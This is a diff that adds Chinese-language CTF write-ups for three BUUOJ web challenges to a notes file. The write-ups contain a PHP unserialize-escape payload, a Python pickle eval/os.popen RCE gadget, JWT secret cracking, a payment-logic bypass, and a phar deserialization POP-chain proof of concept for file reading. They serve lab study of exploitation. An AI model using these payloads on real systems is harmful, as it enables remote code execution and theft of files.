@@ -8067,7 +8067,8 @@ Connection: close
           return (eval, (r"__import__('os').popen('cat /flag').read()",))
   
   a = A()
-  a = pickle.dumps(a)
+  # 定义序列化版本，其中高版本可以兼容低版本，所以直接使用最低的版本即可
+  a = pickle.dumps(a, protocol=0)
   print(a)
   print(base64.b64encode(a))
   
@@ -8259,7 +8260,542 @@ payload：
 POST提交：_SESSION[phpflag]=;s:3:"111";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
 ```
 
+## BUUOJ [0CTF 2016]piapiapia 1
 
+> 考点：PHP反序列化逃逸-增加
+
+由于源码量比较大，这里只列出关键源码；
+
+大概就是注册，登录之后，有一个填信息的页面（update.php），用户输入信息后，后端将信息做反序列化并保存到数据库，在`profile.php`y页面做反序列化并将信息展示出来
+
+```php
+# update.php
+<?php
+	require_once('class.php');
+	if($_SESSION['username'] == null) {
+		die('Login First');	
+	}
+	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {
+
+		$username = $_SESSION['username'];
+		if(!preg_match('/^\d{11}$/', $_POST['phone']))
+			die('Invalid phone');
+
+		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
+			die('Invalid email');
+		
+		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
+			die('Invalid nickname');
+
+		$file = $_FILES['photo'];
+		if($file['size'] < 5 or $file['size'] > 1000000)
+			die('Photo size error');
+
+		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
+		$profile['phone'] = $_POST['phone'];
+		$profile['email'] = $_POST['email'];
+		$profile['nickname'] = $_POST['nickname'];
+		$profile['photo'] = 'upload/' . md5($file['name']);     // 目标
+
+		$user->update_profile($username, serialize($profile));
+		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
+	}
+	else {
+?>
+```
+
+```php
+# profile.php
+<?php
+	require_once('class.php');
+	if($_SESSION['username'] == null) {
+		die('Login First');	
+	}
+	$username = $_SESSION['username'];
+	$profile=$user->show_profile($username);
+	if($profile  == null) {
+		header('Location: update.php');
+	}
+	else {
+		$profile = unserialize($profile);
+		$phone = $profile['phone'];
+		$email = $profile['email'];
+		$nickname = $profile['nickname'];
+		$photo = base64_encode(file_get_contents($profile['photo']));
+?>
+```
+
+```php
+# class.php
+	# 输入 where 的时候会被替换为 hacker ，导致反序列化逃逸--增多
+	public function filter($string) {
+        # \ \\ 都会被替换为 _
+		$escape = array('\'', '\\\\');
+		$escape = '/' . implode('|', $escape) . '/';
+		$string = preg_replace($escape, '_', $string);
+
+        # 敏感字符替换为 hacker （where）
+		$safe = array('select', 'insert', 'update', 'delete', 'where');
+		$safe = '/' . implode('|', $safe) . '/i';
+		return preg_replace($safe, 'hacker', $string);
+	}
+
+	public function update_profile($username, $new_profile) {
+		$username = parent::filter($username);
+        # 逃逸点
+		$new_profile = parent::filter($new_profile);
+
+		$where = "username = '$username'";
+		return parent::update($this->table, 'profile', $new_profile, $where);
+	}
+
+	public function show_profile($username) {
+		$username = parent::filter($username);
+
+		$where = "username = '$username'";
+		$object = parent::select($this->table, $where);
+		return $object->profile;
+	}
+```
+
+代码分析可知反序列化的内容是如下：
+
+```php
+$profile['phone'] = $_POST['phone'];
+$profile['email'] = $_POST['email'];
+$profile['nickname'] = $_POST['nickname'];
+$profile['photo'] = 'upload/' . md5($file['name']);     // 目标
+
+$user->update_profile($username, serialize($profile));
+```
+
+其中校验信息的话，只有`nickname`没有做取反操作，那么这里我们只要在`nickname`传入一个数组，就能成功绕过正则
+
+![image-20240508000038538](CTF.assets/image-20240508000038538.png)
+
+![image-20240508000255022](CTF.assets/image-20240508000255022.png)
+
+```
+# 构造目标：;}s:5:"photo";s:10:"config.php";}
+
+# payload:
+
+post传入：nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
+```
+
+## BUUOJ [CISCN2019 华北赛区 Day1 Web2]ikun
+
+> JWT弱口令爆破工具地址：https://github.com/brendan-rius/c-jwt-cracker
+
+首先进入提示要买`lv6`，但是找遍了都没有，这里直接上脚本遍历去找，在181页成功找到
+
+![image-20240508160312085](CTF.assets/image-20240508160312085.png)
+
+找到之后会说不够钱买，这里就尝试支付逻辑漏洞，最后再修改折扣处成功实现零元购
+
+![image-20240508160509762](CTF.assets/image-20240508160509762.png)
+
+买到之后会说你不是`admin`，再看Cookie是存在JWT的，解码之后可以看到当前身份是你注册的身份，那么这里就要做一个JWT的弱口令爆破
+
+![image-20240508160608384](CTF.assets/image-20240508160608384.png)
+
+拿到密钥之后直接改身份为admin，在源码处就可以看到一个链接，下载下来之后就是源码，其中在`view`下的`admin`页面存在一个Python pickle 反序列化漏洞，漏洞渲染的模板是`form.html`，反序列化的输出结果为`{{res}}`，如果反序列化失败则输出：`This is Black Technology!`
+
+![image-20240508160723948](CTF.assets/image-20240508160723948.png)
+
+反序列化POC代码如下：
+
+```py
+import pickle
+import urllib.parse
+
+class A(object):
+    def __reduce__(self):
+        # eval 函数执行
+        return (eval, (r"__import__('os').popen('cat /flag.txt').read()",))
+
+a = A()
+a = pickle.dumps(a, protocol=0)
+print(a)
+print(urllib.parse.quote(a))
+```
+
+URL编码后即可拿到flag
+
+![image-20240508160931360](CTF.assets/image-20240508160931360.png)
+
+## BUUOJ [CISCN2019 华北赛区 Day1 Web1]Dropbox
+
+进来注册、登录，上传一张普通的图片文件，再点击下载，这里有一个任意文件读取漏洞
+
+![image-20240508210137315](CTF.assets/image-20240508210137315.png)
+
+把所有的源码都读取下来，这里只展示关键源码
+
+```php
+# class.php
+<?php
+error_reporting(0);
+$dbaddr = "127.0.0.1";
+$dbuser = "root";
+$dbpass = "root";
+$dbname = "dropbox";
+$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);
+
+class User {
+    public $db;
+
+    public function __construct() {
+        global $db;
+        $this->db = $db;
+    }
+
+    public function user_exist($username) {
+        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
+        $stmt->bind_param("s", $username);
+        $stmt->execute();
+        $stmt->store_result();
+        $count = $stmt->num_rows;
+        if ($count === 0) {
+            return false;
+        }
+        return true;
+    }
+
+    public function add_user($username, $password) {
+        if ($this->user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . "SiAchGHmFx");
+        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
+        $stmt->bind_param("ss", $username, $password);
+        $stmt->execute();
+        return true;
+    }
+
+    public function verify_user($username, $password) {
+        if (!$this->user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . "SiAchGHmFx");
+        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
+        $stmt->bind_param("s", $username);
+        $stmt->execute();
+        $stmt->bind_result($expect);
+        $stmt->fetch();
+        if (isset($expect) && $expect === $password) {
+            return true;
+        }
+        return false;
+    }
+
+    public function __destruct() {
+        $this->db->close();
+    }
+}
+
+class FileList {
+    private $files;
+    private $results;
+    private $funcs;
+
+    public function __construct($path) {
+        $this->files = array();
+        $this->results = array();
+        $this->funcs = array();
+        $filenames = scandir($path);
+
+        $key = array_search(".", $filenames);
+        unset($filenames[$key]);
+        $key = array_search("..", $filenames);
+        unset($filenames[$key]);
+
+        foreach ($filenames as $filename) {
+            $file = new File();
+            $file->open($path . $filename);
+            array_push($this->files, $file);
+            $this->results[$file->name()] = array();
+        }
+    }
+
+    public function __call($func, $args) {
+        array_push($this->funcs, $func);
+        foreach ($this->files as $file) {
+            $this->results[$file->name()][$func] = $file->$func();
+        }
+    }
+
+    public function __destruct() {
+        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
+        $table .= '<thead><tr>';
+        foreach ($this->funcs as $func) {
+            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
+        }
+        $table .= '<th scope="col" class="text-center">Opt</th>';
+        $table .= '</thead><tbody>';
+        foreach ($this->results as $filename => $result) {
+            $table .= '<tr>';
+            foreach ($result as $func => $value) {
+                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
+            }
+            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
+            $table .= '</tr>';
+        }
+        echo $table;
+    }
+}
+
+class File {
+    public $filename;
+
+    public function open($filename) {
+        $this->filename = $filename;
+        if (file_exists($filename) && !is_dir($filename)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    public function name() {
+        return basename($this->filename);
+    }
+
+    public function size() {
+        $size = filesize($this->filename);
+        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
+        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
+        return round($size, 2).$units[$i];
+    }
+
+    public function detele() {
+        unlink($this->filename);
+    }
+
+    public function close() {
+        return file_get_contents($this->filename);
+    }
+}
+?>
+```
+
+```php
+#download.php
+<?php
+session_start();
+if (!isset($_SESSION['login'])) {
+    header("Location: login.php");
+    die();
+}
+
+if (!isset($_POST['filename'])) {
+    die();
+}
+
+include "class.php";
+ini_set("open_basedir", getcwd() . ":/etc:/tmp");
+
+chdir($_SESSION['sandbox']);
+$file = new File();
+$filename = (string) $_POST['filename'];
+if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
+    Header("Content-type: application/octet-stream");
+    Header("Content-Disposition: attachment; filename=" . basename($filename));
+    echo $file->close();
+} else {
+    echo "File not exist";
+}
+?>
+
+```
+
+```php
+<?php
+session_start();
+if (!isset($_SESSION['login'])) {
+    header("Location: login.php");
+    die();
+}
+
+if (!isset($_POST['filename'])) {
+    die();
+}
+
+include "class.php";
+
+chdir($_SESSION['sandbox']);
+$file = new File();
+$filename = (string) $_POST['filename'];
+if (strlen($filename) < 40 && $file->open($filename)) {
+    $file->detele();
+    Header("Content-type: application/json");
+    $response = array("success" => true, "error" => "");
+    echo json_encode($response);
+} else {
+    Header("Content-type: application/json");
+    $response = array("success" => false, "error" => "File not exist");
+    echo json_encode($response);
+}
+?>
+```
+
+提示已经很清楚了，就是`phar`反序列化，先找反序列化的入口，在`download.php`和`delete.php`都可以触发`phar://`反序列化
+
+`download.php`的`$file->close()`触发`file_get_contents()`可以进行`phar://`反序列化
+
+![image-20240508210519827](CTF.assets/image-20240508210519827.png)
+
+`FILE::close()`方法
+
+![image-20240508210637855](CTF.assets/image-20240508210637855.png)
+
+但是由于`download.php`的`ini_set("open_basedir", getcwd() . ":/etc:/tmp");`限制，导致只能读取`/etc /tmp getcwd()`目录下的内容。所以暂不考虑
+
+再看`delete.php`，`$file->delete`触发`unlink()`函数，也可以触发`phar://`，且没有目录的限制
+
+![image-20240508210840566](CTF.assets/image-20240508210840566.png)
+
+![image-20240508210918021](CTF.assets/image-20240508210918021.png)
+
+再看反序列化的POP链，一条最明显的POP链就是：`User.____destruct --> File.__close`，由于`User.____destruct`刚好调用了`close`，那么只要这时`User->db=new File()`，就可以成功调用`file_get_contents()`来读取文件。但是这里是没有回显的，所以还得绕一下
+
+注意到`FileList`有一个`__call`方法，这里的`__call`方法有一个知识点，`__call`会自动接收传参，如下：
+
+```php
+<?php
+class test{
+    public function __call($func, $args){
+        echo "不存在的方法：". $func;
+        echo "\n";
+        var_dump($args);
+    }
+}
+
+$t = new test();
+$t->clone('flag');
+
+# 输出：
+不存在的方法：clone
+E:\phpstudy\phpstudy\phpstudy_pro\WWW\login.php:6:
+array(1) {
+  [0] =>
+  string(4) "flag"
+}
+```
+
+那么`FileList`有一个`__call`方法，且`__destruct`方法会回显，那么得到的新思路是：通过`FileList.__call`方法压入`clone`，如果`$this->file = new File();`那么就会执行`File.cloce()`；`$file->$func()`可以看成是`File.clone()`，执行后的结果返回给`result`数组接收，`__destruce`方法遍历`result`数组的内容
+
+![image-20240508212024453](CTF.assets/image-20240508212024453.png)
+
+POP链接如下：
+
+```
+User.__destruct -> FileList.__call -> File.clone() -> FileList.__destruct
+```
+
+POC 如下：
+
+```php
+# class.php
+<?php
+
+class User
+{
+    public $db;
+
+    public function __construct()
+    {
+        global $db;
+        $this->db = new FileList();
+    }
+
+
+    public function __destruct()
+    {
+        $this->db->close();
+    }
+}
+
+class FileList
+{
+    private $files;
+    private $results;
+    private $funcs;
+
+    public function __construct()
+    {
+        $this->files = array();
+        $this->results = array();
+        $this->funcs = array();
+        $this->file = new File();
+        $this->file->filename = '/flag.txt';
+        array_push($this->files, $this->file);
+    }
+
+    // 当对象调用一个不可访问的方法时调用
+    // $this->files 文件名数组
+    public function __call($func, $args)
+    {
+        array_push($this->funcs, $func);        // clone 压入
+        foreach ($this->files as $file) {
+            $this->results[$file->name()][$func] = $file->$func();      // $this->results[flag.php][clone] = File->clone()
+        }
+    }
+
+    public function __destruct()
+    {
+        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
+        $table .= '<thead><tr>';
+        foreach ($this->funcs as $func) {
+            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
+        }
+        $table .= '<th scope="col" class="text-center">Opt</th>';
+        $table .= '</thead><tbody>';
+        foreach ($this->results as $filename => $result) {
+            $table .= '<tr>';
+            // 遍历输出文件信息
+            foreach ($result as $func => $value) {
+                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
+            }
+            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
+            $table .= '</tr>';
+        }
+        echo $table;
+    }
+}
+
+class File
+{
+    public $filename;
+
+
+    public function name()
+    {
+        return basename($this->filename);
+    }
+
+
+    public function close()
+    {
+        return file_get_contents($this->filename);
+    }
+}
+
+$u = new User();
+
+
+@unlink("test.phar");
+$phar = new Phar("test.phar"); //后缀名必须为phar
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$phar->setMetadata($u); //将自定义的meta-data存入manifest，这里的内容后续在做包含的时候会自动被反序列化
+$phar->addFromString("test.txt", "test"); //添加要压缩的文件
+$phar->stopBuffering();    //签名自动计算
+```
+
+将生成的`test.phar`后缀改为`jpg`然后上传，在`delete`出触发
+
+![image-20240508212350344](CTF.assets/image-20240508212350344.png)
 
 
 
